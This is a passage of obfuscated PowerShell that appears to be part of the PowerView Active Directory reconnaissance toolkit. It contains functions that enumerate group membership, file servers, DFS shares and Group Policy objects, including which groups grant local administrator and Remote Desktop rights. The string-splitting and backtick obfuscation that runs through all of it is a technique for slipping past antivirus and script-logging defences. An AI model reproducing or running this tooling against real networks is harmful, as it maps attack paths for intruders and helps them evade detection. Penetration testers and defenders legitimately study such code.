-f'ass','obj','cl','ect'),("{1}{2}{0}"-f 't','lo','goncoun'),("{1}{2}{0}" -f 'ted','usncr','ea'),("{3}{4}{1}{2}{5}{0}"-f'l','tc','ontr','use','raccoun','o'),("{2}{1}{0}" -f'id','bjectgu','o'),("{2}{0}{1}{3}" -f 'rimarygrou','p','p','id'),("{0}{3}{1}{2}"-f'l','og','off','astl'),("{2}{1}{0}{3}" -f'ccountnam','a','sam','e'),("{1}{2}{0}"-f'dpwdcount','b','a'),("{2}{1}{0}" -f 'ged','n','whencha'),("{0}{2}{1}" -f'm','f','embero'),("{0}{2}{1}"-f'p','dlastset','w'),("{1}{0}"-f'path','ads')))

                    ${MEMb`eRs} = ${gRou`PseaR`c`h`Er}.("{0}{1}"-f'Fi','ndAll').Invoke()
                    ${G`ROU`PfouNdn`AME} = ${Gro`Up`NamE}
                }
                else {
                    &("{2}{1}{0}" -f 'or','rite-Err','W') ("{4}{5}{1}{0}{2}{3}"-f'in','le to f','d Gro','up','Un','ab')
                }
            }
            else {
                if (${gROU`PN`AME}) {
                    ${group`sear`C`H`eR}."f`ILteR" = "(&(objectCategory=group)(name=$GroupName)$Filter)"
                }
                elseif (${s`Id}) {
                    ${GR`oUpSear`CHER}."fILT`ER" = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }
                else {
                    
                    ${S`id} = (&("{2}{1}{0}" -f 'omainSID','t-D','Ge') -Domain ${DO`ma`iN}) + ("{1}{0}" -f '512','-')
                    ${gr`oupse`ArcH`er}."fiL`Ter" = "(&(objectCategory=group)(objectSID=$SID)$Filter)"
                }

                ${GR`oUpsE`A`RChER}.("{1}{2}{0}" -f'ndAll','F','i').Invoke() | &("{0}{2}{1}" -f 'ForE','ch-Object','a') {
                    try {
                        if (!(${_}) -or !(${_}."P`Ro`PErtIEs") -or !(${_}."p`RopERt`I`es"."nA`ME")) { continue }

                        ${GrO`U`Pf`OUn`dnAME} = ${_}."P`RO`PErt`ieS"."NA`me"[0]
                        ${MEM`BeRs} = @()

                        if (${_}."PR`OPER`TIES"."meM`B`eR"."CoU`Nt" -eq 0) {
                            ${F`inIs`hED} = ${FA`l`Se}
                            ${b`o`TToM} = 0
                            ${t`Op} = 0
                            while(!${fiNi`Shed}) {
                                ${T`OP} = ${Bo`T`ToM} + 1499
                                ${mE`mberrA`NGE}="member;range=$Bottom-$Top"
                                ${b`o`TTOM} += 1500
                                ${GrO`Upsea`R`Cher}."pRoPERt`I`Es`ToL`oAD".("{1}{0}"-f 'r','Clea').Invoke()
                                [void]${gRou`PsearC`HEr}."proPe`RTi`estOLoAd".("{0}{1}" -f'Ad','d').Invoke("$MemberRange")
                                try {
                                    ${rE`s`Ult} = ${Gr`OUPSea`RcH`ER}.("{2}{1}{0}"-f'e','On','Find').Invoke()
                                    if (${r`e`SuLT}) {
                                        ${Ra`Ng`ED`proPE`RTY} = ${_}."PRo`p`eR`TIes"."PRO`PeRty`NAMES" -like ("{2}{1}{4}{0}{3}"-f'a','em','m','nge=*','ber;r')
                                        ${RES`UlTs} = ${_}."PrO`PErT`ies".("{1}{0}" -f 'tem','i').Invoke(${rA`Ng`e`dpr`oPERtY})
                                        if (${RES`U`ltS}."co`UNT" -eq 0) {
                                            ${FI`NISHed} = ${tR`Ue}
                                        }
                                        else {
                                            ${Res`U`lts} | &("{3}{2}{1}{0}" -f'bject','h-O','Eac','For') {
                                                ${mEm`BE`Rs} += ${_}
                                            }
                                        }
                                    }
                                    else {
                                        ${FI`N`ishEd} = ${t`RUe}
                                    }
                                } 
                                catch [System.Management.Automation.MethodInvocationException] {
                                    ${Fin`I`shEd} = ${tR`UE}
                                }
                            }
                        } 
                        else {
                            ${MeM`BErS} = ${_}."pRoPER`T`IES"."m`EMb`eR"
                        }
                    } 
                    catch {
                        &("{0}{2}{1}{3}" -f'Write-Ve','os','rb','e') ${_}
                    }
                }
            }

            ${meMb`ERS} | &("{1}{0}{3}{2}" -f'h','W','ect','ere-Obj') {${_}} | &("{0}{2}{4}{1}{3}" -f'F','ach','or','-Object','E') {
                
                if (${r`ECu`Rse} -and ${uSEm`AtcHI`NgRu`LE}) {
                    ${ProP`e`RTiES} = ${_}."PropeR`Ti`ES"
                } 
                else {
                    if(${D`om`AINcont`R`Ol`ler}) {
                        ${r`e`suLt} = [adsi]"LDAP://$DomainController/$_"
                    }
                    else {
                        ${REs`U`LT} = [adsi]"LDAP://$_"
                    }
                    if(${r`ESu`lt}){
                        ${p`RoP`erTies} = ${R`ESu`lt}."pr`OPErTi`ES"
                    }
                }

                if(${Pr`OpeRTI`eS}) {

                    if(${PRop`er`T`iES}."sam`AccoUnt`TypE" -notmatch ("{2}{0}{1}" -f '53063','68','80')) {
                        ${ISg`Ro`UP} = ${tR`Ue}
                    }
                    else {
                        ${i`sGRoUp} = ${f`ALSE}
                    }

                    if (${f`U`lLdatA}) {
                        ${Gr`o`UpMe`MbER} = &("{3}{1}{0}{2}" -f 'DAPProper','-L','ty','Convert') -Properties ${PrO`PERti`es}
                    }
                    else {
                        ${GR`O`Upmemb`er} = &("{1}{0}{2}" -f'-Obj','New','ect') ("{1}{0}" -f 'SObject','P')
                    }

                    ${G`R`OUp`mEMBEr} | &("{1}{2}{0}" -f 'Member','Ad','d-') ("{1}{0}{2}" -f'epropert','Not','y') ("{3}{2}{0}{1}"-f'm','ain','pDo','Grou') ${dom`AIN}
                    ${g`RoupmEm`BeR} | &("{1}{0}{2}"-f'd-','Ad','Member') ("{0}{1}{2}"-f 'Noteprop','er','ty') ("{1}{0}{2}"-f'a','GroupN','me') ${G`ROU`pFo`UndnAme}

                    try {
                        ${mEM`BeR`dn} = ${pRO`pErt`IeS}."DistiNgUi`Sh`EDN`AmE"[0]
                        
                        
                        ${ME`MB`e`RdOMA`In} = ${MEMBe`R`dN}.("{2}{1}{0}"-f 'tring','S','sub').Invoke(${MEMbEr`Dn}.("{2}{1}{0}" -f 'xOf','de','In').Invoke("DC=")) -replace 'DC=','' -replace ',','.'
                    }
                    catch {
                        ${Me`Mber`DN} = ${NU`LL}
                        ${MEm`B`eRdOm`AIn} = ${Nu`LL}
                    }

                    if (${P`RoP`eR`TiES}."sAM`Ac`cOUNTNA`me") {
                        
                        ${mem`B`erna`me} = ${p`RoPER`TI`es}."sam`AccOun`TNaME"[0]
                    } 
                    else {
                        
                        try {
                            ${MeM`BErna`ME} = &("{1}{4}{3}{2}{0}"-f 'Name','Conv','o','-SidT','ert') ${Pr`oPeRT`I`ES}."c`N"[0]
                        }
                        catch {
                            
                            ${Mem`B`E`Rname} = ${PrO`P`eRTIEs}."c`N"
                        }
                    }
                    
                    if(${P`ROP`eRTI`ES}."o`BJEct`SId") {
                        ${m`EM`B`eRSiD} = ((&("{2}{0}{1}{3}" -f'bj','ec','New-O','t') ("{7}{0}{5}{1}{6}{2}{4}{3}"-f 'S','ci','SecurityI','ntifier','de','ecurity.Prin','pal.','System.') ${Pr`Op`ERTi`es}."oB`ject`Sid"[0],0)."v`AlUe")
                    }
                    else {
                        ${M`em`BEr`sid} = ${n`ULl}
                    }

                    ${Gr`O`Up`MEmbER} | &("{2}{0}{1}"-f 'em','ber','Add-M') ("{3}{2}{0}{1}"-f 'ro','perty','otep','N') ("{2}{0}{1}{3}"-f 'berD','om','Mem','ain') ${m`eMB`ERdOMaIN}
                    ${gROu`p`memb`Er} | &("{0}{1}{2}"-f 'A','dd-M','ember') ("{2}{3}{0}{1}"-f't','y','Note','proper') ("{3}{2}{0}{1}" -f'Na','me','mber','Me') ${mEmB`E`RNAME}
                    ${G`Ro`UP`MEMBER} | &("{1}{2}{3}{0}"-f 'ber','Ad','d','-Mem') ("{0}{3}{1}{2}"-f'No','rope','rty','tep') ("{1}{2}{0}{3}"-f 'erS','Me','mb','id') ${mEmb`Ers`id}
                    ${GROuPmE`M`BER} | &("{2}{0}{1}" -f'embe','r','Add-M') ("{2}{1}{0}"-f'y','opert','Notepr') ("{0}{1}" -f 'Is','Group') ${isGr`OUp}
                    ${grOU`PME`MbEr} | &("{1}{0}{2}"-f'embe','Add-M','r') ("{1}{2}{0}{3}" -f'r','No','teprope','ty') ("{1}{2}{0}"-f'erDN','M','emb') ${meM`BE`RdN}
                    ${GROUpMEM`B`Er}

                    
                    if (${Rec`U`RSE} -and !${Us`EM`A`TChIngrULe} -and ${i`sG`Roup} -and ${M`em`BER`NAMe}) {
                        &("{5}{1}{4}{2}{0}{3}"-f'mbe','tG','pMe','r','rou','Get-Ne') -FullData -Domain ${me`mberdo`M`AIn} -DomainController ${D`OMAi`NCO`NTro`LlEr} -GroupName ${ME`mbErN`Ame} -Recurse -PageSize ${P`AG`EsIZe}
                    }
                }

            }
        }
    }
}


function ge`T-n`E`Tf`iLeSeRvEr {


    [CmdletBinding()]
    param(
        [String]
        ${doM`A`iN},

        [String]
        ${dO`maiN`CONtRo`l`LER},

        [String[]]
        ${T`A`R`GEtUSErS},

        [ValidateRange(1,10000)] 
        [Int]
        ${pA`gEsiZe} = 200
    )

    function SPLI`T`Path {
        
        param([String]${PA`Th})

        if (${p`ATh} -and (${p`Ath}.("{0}{1}"-f'spl','it').Invoke("\\")."c`OUNT" -ge 3)) {
            ${Te`Mp} = ${PA`TH}.("{0}{1}" -f'sp','lit').Invoke("\\")[2]
            if(${tE`mP} -and (${te`MP} -ne '')) {
                ${t`EmP}
            }
        }
    }

    &("{0}{3}{2}{1}" -f 'G','er','Us','et-Net') -Domain ${D`oMaIN} -DomainController ${dOM`Ai`NcoN`TROllEr} -PageSize ${p`AGeSi`Ze} | &("{1}{3}{2}{0}" -f 're-Object','W','e','h') {${_}} | &("{3}{0}{2}{1}" -f 'ere-O','ct','bje','Wh') {
            
            if(${Tar`gEtu`SERS}) {
                ${T`Ar`geTu`SErs} -Match ${_}."saMAC`c`o`UNTnAMe"
            }
            else { ${TR`Ue} } 
        } | &("{2}{0}{1}"-f'c','t','Foreach-Obje') {
            
            if(${_}."H`oMEdire`C`TORy") {
                &("{0}{1}" -f'SplitPat','h')(${_}."ho`mEDiRECt`orY")
            }
            if(${_}."scRIp`TP`A`TH") {
                &("{2}{1}{0}" -f'ath','plitP','S')(${_}."s`c`RiPtpAth")
            }
            if(${_}."P`R`OfIlEPaTH") {
                &("{1}{2}{0}" -f 'Path','Sp','lit')(${_}."PR`O`FiLePath")
            }

        } | &("{1}{3}{0}{2}"-f 'e-Objec','Wh','t','er') {${_}} | &("{2}{1}{0}{3}" -f'j','ort-Ob','S','ect') -Unique
}


function G`Et`-D`FSshaRE {


    [CmdletBinding()]
    param(
        [String]
        [ValidateSet("All","V1","1","V2","2")]
        ${vEr`S`iOn} = "All",

        [String]
        ${D`o`MaIn},

        [String]
        ${DoM`A`i`NCOn`TrOlLer},

        [String]
        ${ads`p`AtH},

        [ValidateRange(1,10000)] 
        [Int]
        ${P`AG`e`SIzE} = 200
    )

    function get`-Df`SsH`AREV1 {
        [CmdletBinding()]
        param(
            [String]
            ${Dom`AIn},

            [String]
            ${doMAIncoNTr`O`LL`er},

            [String]
            ${a`Dsp`AtH},

            [ValidateRange(1,10000)] 
            [Int]
            ${PA`Ges`IZE} = 200
        )

        ${d`FsS`EARCH`Er} = &("{0}{2}{1}{4}{5}{3}" -f'Get-','ain','Dom','her','S','earc') -Domain ${do`MaiN} -DomainController ${D`OMaINcont`R`oLl`Er} -ADSpath ${aD`sP`ATh} -PageSize ${p`AG`Esize}

        if(${df`S`SEaRCH`eR}) {
            ${dfssHA`R`ES} = @()
            ${Dfs`SE`ArcH`Er}."Fi`L`TER" = ("{1}{4}{2}{0}{3}" -f 'Df','(&(objec','s=fT','s))','tClas')

            try {
                ${D`Fs`SEarCh`er}.("{1}{0}" -f 'ndAll','Fi').Invoke() | &("{3}{1}{0}{2}"-f 'ec','e-Obj','t','Wher') {${_}} | &("{1}{0}{2}{4}{3}"-f 'rEac','Fo','h-','ect','Obj') {
                    ${PRo`PEr`T`iEs} = ${_}."PR`o`peRTIeS"
                    ${rEmotEN`A`MeS} = ${pR`opERtI`ES}."R`EMO`TEse`R`VERnA`me"

                    ${dF`s`sHArEs} += ${ReMo`Te`NAMES} | &("{1}{2}{3}{0}" -f 'Object','For','Each','-') {
                        try {
                            if ( ${_}.("{2}{0}{1}" -f 'ontain','s','C').Invoke('\') ) {
                                &("{2}{1}{0}"-f 'bject','ew-O','N') -TypeName ("{0}{2}{1}"-f 'P','ect','SObj') -Property @{("{0}{1}"-f 'Nam','e')=${pRO`PER`TiES}."Na`Me"[0];("{4}{3}{1}{0}{2}" -f'ver','eSer','Name','ot','Rem')=${_}.("{0}{1}" -f 's','plit').Invoke("\")[2]}
                            }
                        }
                        catch {
                            &("{3}{0}{2}{1}" -f'eb','g','u','Write-D') ('Err'+'or '+'in'+' '+'parsin'+'g '+'D'+'FS '+'sha'+'re'+' '+': '+"$_")
                        }
                    }
                }
            }
            catch {
                &("{2}{0}{1}{3}"-f'rite-W','arn','W','ing') ('Get'+'-'+'DFSshareV2 '+'e'+'rr'+'or '+': '+"$_")
            }
            ${dfSsH`AR`Es} | &("{2}{1}{0}" -f 'ect','-Obj','Sort') -Property ("{2}{1}{0}{3}" -f 'erNa','v','RemoteSer','me')
        }
    }

    function GEt-`DFSS`hareV2 {
        [CmdletBinding()]
        param(
            [String]
            ${DO`maiN},

            [String]
            ${dOM`Ai`N`Con`TRoL`LeR},

            [String]
            ${aDSP`ATh},

            [ValidateRange(1,10000)] 
            [Int]
            ${Pa`ge`SiZe} = 200
        )

        ${d`FSSEaRCh`Er} = &("{1}{0}{3}{2}" -f 't-D','Ge','archer','omainSe') -Domain ${d`omaIN} -DomainController ${dOMA`inCo`NTRo`ll`Er} -ADSpath ${ads`pa`Th} -PageSize ${PagES`i`zE}

        if(${Df`s`sEARCHeR}) {
            ${D`F`SSHAR`Es} = @()
            ${DFSSe`A`Rc`hEr}."Fil`T`eR" = (("{2}{6}{3}{1}{5}{0}{4}" -f'DFS-Link','tCl','(','bjec','v2))','ass=ms','&(o'))
            ${dfSSeaRC`h`Er}."P`RopERT`I`E`sTOload".("{1}{0}"-f'ddRange','A').Invoke((("{4}{0}{1}{3}{2}" -f's-li','nkpat','2','hv','msdf'),("{0}{2}{1}{3}"-f'ms','FS-TargetL','D','istv2')))

            try {
                ${dFs`Se`Ar`cher}.("{0}{1}" -f'FindAl','l').Invoke() | &("{0}{1}{2}" -f'W','here-Obj','ect') {${_}} | &("{2}{4}{1}{3}{0}" -f 't','Obj','Fo','ec','rEach-') {
                    ${prOp`eR`TIES} = ${_}."P`RO`peR`TiES"
                    ${TaRg`et_LI`st} = ${p`ROpE`RtieS}.'msdfs-targetlistv2'[0]
                    ${X`mL} = [xml] (  &("{0}{1}{3}{2}" -f'g','E','ArIablE','T-V') ('B7'+'8K')  -vALueONl )::"UN`IcO`DE"."geT`stRi`NG"(${t`ArGeT_`LI`sT}[2..(${ta`R`geT`_LIsT}."l`ENgtH"-1)])
                    ${d`F`SsHaREs} += ${x`ML}."taRGE`TS"."ch`il`DNoDES" | &("{2}{0}{1}{3}{4}"-f 'c','h-','ForEa','Objec','t') {
                        try {
                            ${t`ArgET} = ${_}."iN`NeRTEXt"
                            if ( ${ta`R`gEt}.("{2}{0}{1}" -f 'n','tains','Co').Invoke('\') ) {
                                ${D`FsRo`oT} = ${tAR`g`Et}.("{1}{0}"-f 'plit','s').Invoke("\")[3]
                                ${s`h`AreNAmE} = ${PRoP`eRTI`es}.'msdfs-linkpathv2'[0]
                                &("{0}{1}{2}" -f'Ne','w','-Object') -TypeName ("{2}{1}{0}"-f't','Objec','PS') -Property @{("{0}{1}" -f 'Nam','e')="$DFSroot$ShareName";("{3}{1}{2}{0}"-f'e','verN','am','RemoteSer')=${tA`RGEt}.("{1}{0}"-f 't','spli').Invoke("\")[2]}
                            }
                        }
                        catch {
                            &("{2}{0}{1}" -f'D','ebug','Write-') ('Err'+'or '+'in'+' '+'par'+'s'+'ing '+'ta'+'rget'+' '+': '+"$_")
                        }
                    }
                }
            }
            catch {
                &("{2}{1}{0}"-f'rning','e-Wa','Writ') ('Ge'+'t-D'+'FS'+'sha'+'reV2 '+'e'+'rror '+': '+"$_")
            }
            ${dfs`sHAR`Es} | &("{1}{0}{2}"-f'rt','So','-Object') -Unique -Property ("{1}{3}{0}{2}"-f'Nam','R','e','emoteServer')
        }
    }

    ${dfs`shA`R`Es} = @()
    
    if ( (${v`ersion} -eq "all") -or (${ve`RSi`on}.("{0}{1}{2}"-f'en','dsWi','th').Invoke("1")) ) {
        ${dfSs`H`AreS} += &("{3}{0}{2}{4}{1}" -f 'DFS','1','s','Get-','hareV') -Domain ${d`oMA`iN} -DomainController ${dO`mAiN`cOnTr`OL`lEr} -ADSpath ${aDS`PATh} -PageSize ${P`A`GEs`IZe}
    }
    if ( (${vERsI`on} -eq "all") -or (${vErS`ioN}.("{1}{0}"-f'ndsWith','e').Invoke("2")) ) {
        ${d`F`sShA`REs} += &("{2}{3}{0}{1}" -f 's','hareV2','G','et-DFS') -Domain ${do`mA`In} -DomainController ${DO`m`Ain`C`ONtRoller} -ADSpath ${AdS`paTh} -PageSize ${p`AGEsI`ze}
    }

    ${DFssH`Ar`eS} | &("{3}{0}{1}{2}" -f'or','t-Ob','ject','S') -Property ("{1}{2}{3}{0}{4}"-f 'rverN','Remo','te','Se','ame')
}








function g`Et-G`pTtmPl {


    [CmdletBinding()]
    Param (
        [Parameter(MAnDAtoRy=${tR`Ue}, VALUeFROmPiPEline=${t`Rue})]
        [String]
        ${g`PTtMplP`Ath},

        [Switch]
        ${usEp`s`DrivE}
    )

    begin {
        if(${u`sEpsDr`IvE}) {
            
            ${P`A`RTS} = ${Gp`Ttm`P`lpatH}.("{1}{0}" -f 't','spli').Invoke('\')
            ${Fo`lDerP`ATH} = ${pA`RTs}[0..(${Pa`Rts}."LE`N`GTh"-2)] -join '\'
            ${F`ILeP`Ath} = ${PA`RTS}[-1]
            ${Ra`NdD`RIVe} = (("{3}{4}{7}{1}{5}{0}{2}{6}" -f 'pqr','ghi','stuvw','a','bcd','jklmno','xyz','ef').("{2}{1}{0}" -f 'Array','ar','ToCh').Invoke() | &("{2}{0}{1}"-f 'et-Rando','m','G') -Count 7) -join ''
            
            &("{2}{1}{3}{0}" -f'se','r','W','ite-Verbo') ('Mou'+'nting '+'p'+'ath '+"$GptTmplPath "+'usin'+'g '+'a '+'t'+'emp '+'PS'+'Driv'+'e '+'at'+' '+"$RandDrive")

            try {
                ${n`ULl} = &("{3}{1}{0}{2}"-f'Dr','S','ive','New-P') -Name ${r`A`NddrivE} -PSProvider ("{3}{1}{2}{0}" -f'ystem','ile','S','F') -Root ${FolD`Er`P`Ath}  -ErrorAction ("{0}{1}" -f'Sto','p')
            }
            catch {
                &("{2}{0}{1}" -f't','e-Debug','Wri') ('Er'+'ror '+'mount'+'ing'+' '+'pat'+'h '+"$GptTmplPath "+': '+"$_")
                return ${n`ULl}
            }

            
            ${gP`TtMpLP`A`TH} = ${r`A`NDdrIVe} + ":\" + ${f`ILe`Path}
        } 
    }

    process {
        ${S`eCtiOnn`A`me} = ''
        ${SeCT`IO`N`ST`EMP} = @{}
        ${SEctI`oNSfIN`Al} = @{}

        try {

            if(&("{2}{1}{0}"-f'Path','t-','Tes') ${g`pTtMPL`paTH}) {

                &("{1}{0}{3}{2}" -f 'rbo','Write-Ve','e','s') ('Pars'+'ing '+"$GptTmplPath")

                &("{0}{2}{1}"-f'Get','Content','-') ${gpt`TMp`lp`AtH} -ErrorAction ("{1}{0}"-f 'op','St') | &("{2}{1}{0}{3}"-f 'c','reach-Obje','Fo','t') {
                    if (${_} -match '\[') {
                        
                        ${sE`CtiO`Nn`AmE} = ${_}."TR`im"('[]') -replace ' ',''
                    }
                    elseif(${_} -match '=') {
                        ${P`ARtS} = ${_}.("{0}{1}" -f 's','plit').Invoke('=')
                        ${P`Ro`pErTYna`mE} = ${Pa`R`Ts}[0].("{0}{1}" -f'tri','m').Invoke()
                        ${pr`Op`Er`TYVaLu`es} = ${p`Ar`Ts}[1].("{0}{1}" -f't','rim').Invoke()

                        if(${pR`OPe`RtY`VaL`UEs} -match ',') {
                            ${PRo`PErT`y`Values} = ${pR`oPeRt`y`VAluEs}.("{0}{1}"-f'sp','lit').Invoke(',')
                        }

                        if(!${S`ecTio`NsT`Emp}[${S`EctI`O`NNamE}]) {
                            ${s`ecTi`ONST`eMP}.("{1}{0}" -f 'd','Ad').Invoke(${SeCTiOn`Na`ME}, @{})
                        }

                        
                        ${S`EC`T`Ions`TeMp}[${sec`Ti`on`NAme}].("{0}{1}" -f 'A','dd').Invoke( ${P`ROpe`Rt`yNaMe}, ${P`ROp`eRtY`V`ALueS} )
                    }
                }

                ForEach (${sE`cti`on} in ${Sec`T`IoNSteMp}."k`Eys") {
                    
                    ${SEc`TiOn`sFINal}[${Sec`TIoN}] = &("{1}{0}{2}" -f'e','New-Obj','ct') ("{0}{1}{2}" -f 'PSO','bj','ect') -Property ${SecTio`N`sTEMp}[${s`ECt`iOn}]
                }

                
                &("{0}{1}{2}" -f 'N','ew-O','bject') ("{1}{0}" -f'ct','PSObje') -Property ${s`Ec`TI`onSFI`NAl}
            }
        }
        catch {
            &("{3}{0}{2}{1}" -f 'r','ug','ite-Deb','W') ('Err'+'or'+' '+'parsi'+'ng'+' '+"$GptTmplPath "+': '+"$_")
        }
    }

    end {
        if(${u`sEP`sDRiVe} -and ${Ra`Ndd`RIVe}) {
            &("{1}{0}{2}"-f 'rite-V','W','erbose') ('Re'+'moving '+'tem'+'p '+'P'+'SDr'+'ive '+"$RandDrive")
            &("{0}{2}{1}" -f'Get-','ve','PSDri') -Name ${r`And`DRIVE} -ErrorAction ("{3}{0}{2}{4}{1}"-f'ile','e','ntly','S','Continu') | &("{2}{1}{0}{3}" -f 'ove-PSDri','em','R','ve')
        }
    }
}


function Get-`gRoUPs`XML {


    [CmdletBinding()]
    Param (
        [Parameter(MANDAtoRy=${TR`Ue}, VALuefrompiPElINe=${t`RUe})]
        [String]
        ${grOuP`S`x`M`lpath},

        [Switch]
        ${R`e`SOlVe`sids},

        [Switch]
        ${uSEps`dRI`VE}
    )

    begin {
        if(${U`SEP`SdrI`Ve}) {
            
            ${p`ARts} = ${G`ROu`PSXML`PatH}.("{0}{1}"-f 'spli','t').Invoke('\')
            ${fO`LDe`RpA`TH} = ${PA`R`Ts}[0..(${pa`R`TS}."leN`gth"-2)] -join '\'
            ${fI`lE`PAtH} = ${p`ArtS}[-1]
            ${R`And`drIVE} = (("{5}{1}{0}{4}{3}{2}" -f'defg','c','stuvwxyz','r','hijklmnopq','ab').("{2}{1}{0}" -f'Array','r','ToCha').Invoke() | &("{1}{0}{2}" -f'o','Get-Rand','m') -Count 7) -join ''
            
            &("{2}{1}{3}{4}{0}"-f 'ose','-V','Write','e','rb') ('Moun'+'tin'+'g'+' '+'pat'+'h '+"$GroupsXMLPath "+'us'+'i'+'ng '+'a '+'temp'+' '+'P'+'SD'+'rive '+'at'+' '+"$RandDrive")

            try {
                ${Nu`Ll} = &("{0}{2}{1}"-f'New-PS','ve','Dri') -Name ${ran`dd`Rive} -PSProvider ("{0}{1}{2}"-f 'Fi','leSys','tem') -Root ${Fo`lDeRP`A`Th}  -ErrorAction ("{1}{0}"-f'top','S')
            }
            catch {
                &("{1}{0}{2}"-f 'e-D','Writ','ebug') ('Err'+'or '+'moun'+'ting '+'pa'+'th '+"$GroupsXMLPath "+': '+"$_")
                return ${Nu`lL}
            }

            
            ${grOUp`sxm`Lp`Ath} = ${rANDdr`i`Ve} + ":\" + ${f`i`lePATh}
        } 
    }

    process {

        
        if(&("{2}{0}{1}"-f't-P','ath','Tes') ${gr`OuPSX`MLPaTH}) {

            [xml] ${gR`o`U`PSXMLcoNtENt} = &("{2}{1}{0}{3}"-f 'en','-Cont','Get','t') ${Gro`U`pSXM`LPaTh}

            
            ${g`R`O`UPSx`mL`coNTeNT} | &("{0}{3}{2}{1}" -f 'Se','ct-Xml','e','l') ("{1}{2}{0}" -f 'up','//','Gro') | &("{3}{1}{0}{2}" -f'e','elect-Obj','ct','S') -ExpandProperty ("{1}{0}"-f 'de','no') | &("{1}{2}{0}{3}"-f'c','F','orEach-Obje','t') {

                ${mE`mBers} = @()
                ${M`EmBE`Rof} = @()

                
                ${LOc`A`LsiD} = ${_}."p`ROPe`RTiES"."GRO`U`PSiD"
                if(!${loCAL`SID}) {
                    if(${_}."proP`Er`Ti`es"."g`Ro`UPnaMe" -match ("{0}{2}{3}{1}" -f 'Admi','s','ni','strator')) {
                        ${Lo`caLsiD} = ("{3}{2}{1}{0}" -f'544','-32-','5','S-1-')
                    }
                    elseif(${_}."pRoPert`I`ES"."GRo`U`p`NamE" -match ("{0}{2}{1}{3}" -f'Rem','k','ote Des','top')) {
                        ${lo`CaL`sID} = ("{3}{2}{1}{0}" -f'55','2-5','1-5-3','S-')
                    }
                    else {
                        ${Lo`cals`id} = ${_}."p`Ro`pE`RtiES"."gROUP`N`AmE"
                    }
                }
                ${ME`Mb`eROf} = @(${loc`ALs`iD})

                ${_}."p`ROpErt`iEs"."MeMBE`Rs" | &("{0}{2}{1}" -f'ForEach','ct','-Obje') {
                    
                    ${_} | &("{1}{0}{2}"-f'bjec','Select-O','t') -ExpandProperty ("{1}{0}"-f'ember','M') | &("{1}{0}{2}" -f'e-Obj','Wher','ect') { ${_}."acTI`on" -match 'ADD' } | &("{1}{2}{3}{0}" -f 'ct','ForEach-','Ob','je') {

                        if(${_}."s`id") {
                            ${m`EMBers} += ${_}."s`ID"
                        }
                        else {
                            
                            ${m`Embe`RS} += ${_}."na`ME"
                        }
                    }
                }

                if (${ME`M`BERS} -or ${mE`Mb`EroF}) {
                    
                    ${FILt`e`Rs} = ${_}."F`I`lTErS" | &("{2}{0}{1}"-f 'h-Objec','t','ForEac') {
                        ${_} | &("{1}{0}{2}" -f 'e','S','lect-Object') -ExpandProperty ("{2}{0}{1}" -f'ter','*','Fil') | &("{2}{1}{0}" -f 'Object','-','ForEach') {
                            &("{2}{0}{1}" -f 'w-Obje','ct','Ne') -TypeName ("{0}{1}{2}" -f 'PSOb','jec','t') -Property @{("{1}{0}" -f 'ype','T') = ${_}."Loca`lN`AME";("{0}{1}" -f'V','alue') = ${_}."NA`mE"}
                        }
                    }

                    if(${res`OLVES`iDs}) {
                        ${MeM`Ber`Of} = ${Me`m`BeRoF} | &("{2}{1}{3}{0}" -f'Object','h','ForEac','-') {&("{3}{1}{0}{2}" -f 'm','-SidToNa','e','Convert') ${_}}
                        ${mE`MBE`RS} = ${MEm`BE`RS} | &("{0}{3}{1}{2}"-f 'For','ch-','Object','Ea') {&("{3}{0}{1}{2}" -f 'onvert-SidToN','am','e','C') ${_}}
                    }

                    if(${mE`M`BEroF} -isnot [system.array]) {${M`emb`erOf} = @(${meMB`eRof})}
                    if(${meMb`E`Rs} -isnot [system.array]) {${M`eMB`Ers} = @(${m`emB`eRS})}

                    ${g`PopRoP`E`RtIeS} = @{
                        ("{2}{1}{3}{0}{4}"-f 'ayN','P','G','ODispl','ame') = ${gPO`dIs`pLayNAme}
                        ("{1}{2}{0}" -f'e','G','PONam') = ${gpO`N`AmE}
                        ("{2}{1}{0}" -f'th','Pa','GPO') = ${gr`Ou`pSXmlp`ATH}
                        ("{1}{0}" -f 'lters','Fi') = ${fI`l`TErS}
                        ("{1}{0}{2}" -f'mber','Me','Of') = ${ME`mBe`Rof}
                        ("{0}{2}{1}"-f 'M','rs','embe') = ${memB`erS}
                    }

                    &("{1}{2}{0}{3}" -f'c','Ne','w-Obje','t') -TypeName ("{0}{1}"-f 'PSO','bject') -Property ${GpO`pR`op`e`RtIeS}
                }
            }
        }
    }

    end {
        if(${u`sePs`driVe} -and ${ranDDr`I`VE}) {
            &("{2}{3}{1}{0}"-f'se','rbo','Writ','e-Ve') ('Rem'+'o'+'ving '+'t'+'emp '+'P'+'SD'+'rive '+"$RandDrive")
            &("{0}{3}{1}{2}" -f'G','-PSD','rive','et') -Name ${rAN`Ddr`iVE} -ErrorAction ("{2}{1}{0}{3}"-f'tin','ntlyCon','Sile','ue') | &("{0}{2}{1}" -f 'Remove-PSD','e','riv')
        }
    }
}



function g`Et-netG`Po {

    [CmdletBinding()]
    Param (
        [Parameter(ValUefRomPIPeLIne=${Tr`UE})]
        [String]
        ${G`PO`NAme} = '*',

        [String]
        ${D`IsPLaYNA`Me},

        [String]
        ${D`o`mAIN},

        [String]
        ${DOMaIn`COntR`o`LLER},
        
        [String]
        ${a`DsPA`Th},

        [ValidateRange(1,10000)] 
        [Int]
        ${P`Ag`EsIZE} = 200

    )

    begin {
        ${GPO`seArC`HER} = &("{4}{3}{2}{0}{1}" -f 'he','r','rc','et-DomainSea','G') -Domain ${do`ma`In} -DomainController ${D`o`maI`NCo`NtrollER} -ADSpath ${A`DSP`ATh} -PageSize ${p`AGe`sI`ze}
    }

    process {
        if (${g`pO`sEar`chEr}) {
            if(${D`Is`p`lAYNAMe}) {
                ${gPoS`E`ArcH`er}."FILt`eR"="(&(objectCategory=groupPolicyContainer)(displayname=$DisplayName))"
            }
            else {
                ${Gp`OsEA`Rcher}."f`IlT`eR"="(&(objectCategory=groupPolicyContainer)(name=$GPOname))"
            }

            ${G`PO`seaRcH`er}.("{1}{0}" -f 'ndAll','Fi').Invoke() | &("{0}{3}{1}{2}" -f 'Wh','-','Object','ere') {${_}} | &("{3}{2}{4}{1}{0}"-f't','ch-Objec','or','F','Ea') {
                
                &("{4}{0}{3}{2}{1}"-f't','perty','Pro','-LDAP','Conver') -Properties ${_}."p`R`OpeRtIEs"
            }
        }
    }
}


function G`E`T-nEtgpOGrO`UP {


    [CmdletBinding()]
    Param (
        [String]
